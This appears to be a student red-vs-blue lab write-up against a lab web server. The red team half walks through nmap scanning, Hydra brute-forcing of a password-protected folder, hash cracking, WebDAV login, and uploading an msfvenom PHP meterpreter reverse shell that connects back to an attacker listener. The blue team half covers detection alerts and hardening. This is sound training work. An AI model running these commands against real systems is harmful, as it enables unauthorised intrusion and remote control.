# Red-vs-Blue-Project

Red team attack
Step 1: Discover the IP address of the Linux server.
In order to find the IP address of the machine, you will need to use Nmap to scan your network.
•	Open the terminal and run: nmap 192.168.1.0/24
 

From the Nmap scan we can see that port 80 is open. Open a web browser and type the IP address of the machine into the address bar.
•	Open a web browser and run 192.168.1.105 and press enter.
 
 
Step 2: Locate the hidden directory on the server.
•	Navigating through different directories, you will see a reoccurring message:
refer to company_folders/secret_folder for more information
ERROR: company_folders/secret_folder/ is no longer accessible to the public
•	Navigate to the directory by typing: 192.168.1.105/company_folders/secret_folder
 
•	The directory asks for authentication in order to access it. 
Step 3: Brute force the password for the hidden directory.
Because the folder is password protected, we need to either guess the password or brute force into the directory. In this case, it would be much more efficient to use a brute force attack, specifically Hydra.
•	Using Ashton's name, run the Hydra attack against the directory:
o	Type:   hydra -l ashton -P /usr/share/wordlists/rockyou.txt -s 80 -f -vV 192.168.1.105 http-get  /company_folders/secret_folder
 
•	The brute force attack may take some time. Once it finishes, you'll find the username is ashton and the password is leopoldo.

•	Go back to the web browser and use the credentials above to log in. Click the file connect_to_corp_server file. 
•	Located inside of the file are instructions on how to connect to the WebDAV directory, as well the user's username and hashed password.
 
 
 
Step 4: Connect to the server via Webdav
There are several ways to break the password hash. Here, we simply used Crack Station, to avoid waiting for john to crack the password.

Navigate to https://crackstation.net; paste the password hash and fill out the CAPTCHA; and click Crack Hashes.
  
•	The password is revealed as: linux4u
Step 5: Connect to the server via WebDAV.
This may be the most difficult part of the Red Team exercise, as it will require students to do external research on how to connect to the VM's WebDAV directory.
•	In order to do so, We will already need to have the user name and following instructions from the secret_folder. Direct students to:
o	Open the File System shortcut from the desktop.
o	Click Browse Network.
o	In the URL bar, type: dav://192.168.1.105/webdav, and enter the credentials ryan and password linux4u to log in.
 
Step 6: Upload a PHP reverse shell payload.
•	To set up the reverse shell payload, run:
msfvenom -p php/meterpreter/reverse_tcp lhost=192.168.1.90 lport=4444 > shell.php

•	Run this series of commands to set up a listener:
o	msfconsole to launch msfconsole.
o	use exploit/multi/handler
o	set payload php/meterpreter/reverse_tcp
o	show options and point out they need to set the LHOST.
o	set LHOST 192.168.1.90
o	exploit
 
•	Place the reverse shell onto the WebdDAV directory.
  
•	Now that you're logged in, connect to the webdav folder by navigating to 192.168.1.105/webdav. Use the credentials that you used before, user:ryan pass:linux4u.
•	Navigate to where you first uploaded the reverse shell and click it to activate it. If it seems like the browser is hanging or loading, that means it has worked.
Note that If it asks you if you'd like to save or open the PDF file, start again at the beginning of Step 5.
 
Step 7: Find and capture the flag.
•	On the listener, search for the file flag.txt located in the root directory. We can use many techniques they have learned in order to find it.
•	On the listener, search for the file flag.txt located in the root directory. We can use many techniques they have learned to find it. One technique is to run:
o	Drop into a bash shell with the command: shell
o	Go to the / directory: cd /
o	Search the system for any files containing the phrase "flag" : find . -iname flag.txt
We can read the file, once located, with cat.
 




Blue team analysis

1.	Identify the offensive traffic.
Identify the traffic between your machine and the web machine:
•	When did the interaction occur?
On June 13 2020 @03:00 PM
 
•	What responses did the victim send back?
401 , 200 , 207 and 404
 

•	What data is concerning from the Blue Team perspective?
There are some panels in the dashboard such as the connection over time and errors vs successful transaction gives a quick indication on the malicious connection between the source and target machines.
 

 


2.	Find the request for the hidden directory.
In your attack, you found a secret folder. Let's look at that interaction between these two machines.
•	How many requests were made to this directory? At what time and from which IP address(es)?
6019 requests at June 13 time 03:00 PM from 192.168.1.90

 

 
•	Which files were requested? What information did they contain?
http://192.168.1.105/company_folders/secret_folder/connect_to_corp_server
 trying to get info about ryan user 
•	What kind of alarm would you set to detect this behavior in the future?
We could  set an alert of any machine trying to access this directory or file. 
•	Identify at least one way to harden the vulnerable machine that would mitigate this attack.
The simplest way to mitigate this malicious access is to remove that file and secret folder from the server.

3.	Identify the brute force attack.
After identifying the hidden directory, you used Hydra to brute-force the target server. Answer the following questions:
•	Can you identify packets specifically from Hydra?
On Discover tab we could use the search filter :
url.path : "/company_folders/secret_folder/" and source.ip : 192.168.1.90 and destination.ip : 192.168.1.105
to get results of the traffic which been applied through the hydra tool and get the below info.
 


•	How many requests were made in the brute-force attack?
6019 requests by hydra tool
 
•	How many requests had the attacker made before discovering the correct password in this one?
6015 requests made by hydra before the attacker discover the right password but the secret_folder/connect_to_corp_server file has been requested successfully just 1.

 
•	What kind of alarm would you set to detect this behavior in the future and at what threshold(s)?
Setting the alert when a machine attempt to access the mentioned link above as Brute Force Alert which indicates the number of failed attempts to the secret_folder, And the threshold vary but maybe 15 attempts per hour.
•	Identify at least one way to harden the vulnerable machine that would mitigate this attack.
Setting IPS which drop the failed attempt to access the secret_folder when returned error code 401 or applying locking the user when meet the limit threshold on the failed attempts.

4.	Find the WebDav connection.
Use your dashboard to answer the following questions:
•	How many requests were made to this directory?
24 requests 
 
•	Which file(s) were requested?
Shell.php
•	What kind of alarm would you set to detect such access in the future?
Any user not authorized to access the webdav will send an email to the SOC
•	Identify at least one way to harden the vulnerable machine that would mitigate this attack.
We could restrict the access to webdav from web interface by firewall.

5.	Identify the reverse shell and meterpreter traffic.
To finish off the attack, you uploaded a PHP reverse shell and started a meterpreter shell session. Answer the following questions:
•	Can you identify traffic from the meterpreter session?
 

 

•	What kinds of alarms would you set to detect this behavior in the future?
                      We can set an alert for any .php file that is uploaded to a server.
•	Identify at least one way to harden the vulnerable machine that would mitigate this attack.
Removing the ability to upload files to this directory over the web interface would take care of this issue.
